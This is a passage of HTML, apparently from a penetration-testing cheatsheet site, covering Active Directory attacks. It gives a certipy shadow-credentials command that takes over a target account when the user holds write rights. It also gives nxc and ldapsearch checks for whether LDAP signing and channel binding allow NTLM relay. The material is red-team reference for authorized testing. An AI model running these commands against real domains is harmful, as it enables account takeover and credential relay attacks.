+</span></span></code></pre></div><p>Shadow Credentials (msDS-KeyCredentialLink, if you have write rights):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>certipy shadow auto -u <span class=s2>&#34;</span><span class=nv>$USER</span><span class=s2>@</span><span class=nv>$DOMAIN</span><span class=s2>&#34;</span> -p <span class=s2>&#34;</span><span class=nv>$PASS</span><span class=s2>&#34;</span> -account targetuser
+</span></span></code></pre></div><h2 id=viii-ldap-signing-and-channel-binding data-heading-permalink=true><span class=heading-content>viii. LDAP signing and channel binding</span>
+<a class=heading-permalink href=#viii-ldap-signing-and-channel-binding aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nxc ldap <span class=nv>$DC</span> -u <span class=s2>&#34;</span><span class=nv>$USER</span><span class=s2>&#34;</span> -p <span class=s2>&#34;</span><span class=nv>$PASS</span><span class=s2>&#34;</span> -M ldap-checker
+</span></span><span class=line><span class=cl><span class=c1>## or check manually:</span>
+</span></span><span class=line><span class=cl>ldapsearch -x -H ldap://<span class=nv>$DC</span> -b <span class=s2>&#34;&#34;</span> -s base
+</span></span><span class=line><span class=cl><span class=c1>## If anonymous bind works on 389 -&gt; LDAP signing NOT required</span>
+</span></span><span class=line><span class=cl><span class=c1>## If LDAPS rejects PLAIN -&gt; channel binding enforced</span>
+</span></span></code></pre></div><p>Why it matters: NTLM relay to LDAP/LDAPS works only when signing is off and channel binding is not enforced. See <a href=https://jinpwn.dev/cheatsheets/active-directory/ad06-llmnr--ntlm-relay/>AD06 LLMNR & NTLM Relay</a>
+.</p></div><nav class="cheatsheet-pager is-split" aria-label="Sibling cheatsheet navigation"><a class="cheatsheet-pager-link is-prev" href=/cheatsheets/misc/file-transfer/><div class=cheatsheet-pager-copy><span class=cheatsheet-pager-label>Previous</span>
+<span class=cheatsheet-pager-title>File Transfer</span></div><span class=cheatsheet-pager-arrow aria-hidden=true><svg width="16" height="16" viewBox="0 0 24 24" class="cheatsheet-pager-icon" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="m12 19-7-7 7-7"/><path d="M19 12H5"/></svg>
+</span></a><a class="cheatsheet-pager-link is-next" href=/cheatsheets/misc/password-cracking/><div class=cheatsheet-pager-copy><span class=cheatsheet-pager-label>Next</span>
+<span class=cheatsheet-pager-title>Password Cracking</span></div><span class=cheatsheet-pager-arrow aria-hidden=true><svg width="16" height="16" viewBox="0 0 24 24" class="cheatsheet-pager-icon is-next" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="m12 19-7-7 7-7"/><path d="M19 12H5"/></svg></span></a></nav></div></div></article></main><button class=scroll-top-button type=button data-scroll-top aria-label="Scroll to top" aria-hidden=true tabindex=-1>
+<svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 18V6"/><path d="M6.75 11.25 12 6l5.25 5.25"/></svg></button><footer class=site-footer><p>&copy; 2026 JinPwn</p></footer></body></html>
